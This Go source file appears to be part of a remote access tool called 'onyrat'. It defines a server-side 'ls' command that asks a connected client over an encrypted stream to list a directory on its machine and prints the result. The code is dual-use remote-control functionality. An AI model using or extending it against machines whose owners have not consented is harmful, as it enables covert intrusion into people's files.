//go:build server
// +build server

package handlers

import (
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/commands/files"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/abiosoft/ishell"
)

func RegisterListFilesCommand(s *network.KCPServer, shell *ishell.Shell) {
	shell.AddCmd(&ishell.Cmd{
		Name: "ls",
		Help: "list files in a directory on a client",
		LongHelp: `
Usage: ls <id|address> <path>

Lists files in the specified directory on a client.

Examples:
  ls 1 /home/user/
  ls 192.168.10.214:8000 .
  ls 0`,

		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				c.Println("Type `ls help` for more information")
				c.HelpText()
				c.Err(fmt.Errorf("not enough arguments"))
				return
			}

			address := c.Args[0]
			if address == "" {
				c.Println("Usage: ls <id|address> <path>")
				c.Err(fmt.Errorf("invalid address/id"))
				return
			}

			path := ""
			if len(c.Args) >= 2 {
				path = c.Args[1]
			}
			if path == "" {
				path = "."
			}

			client, err := getClient(s, address)
			if err != nil {
				c.Println("Failed to get client")
				c.Err(err)
				return
			}

			address = client.Sess.RemoteAddr().String()

			stream, err := getStream(client)
			if err != nil {
				c.Println("Failed to get stream")
				c.Err(err)
				return
			}

			if err := s.SendEncrypted(stream, []byte(c.Cmd.Name), 10*time.Second); err != nil {
				c.Println("Failed to send command to client")
				c.Err(err)
				return
			}

			if err := s.SendEncrypted(stream, []byte(path), 10*time.Second); err != nil {
				c.Println("Failed to send path to client")
				c.Err(err)
				return
			}

			files, err := files.ReceiveFiles(s, client)
			if err != nil {
				c.Printf("Failed to list files in path: %s: %v\n", path, err)
				return
			}
			c.Println(files)
		},
	})
}
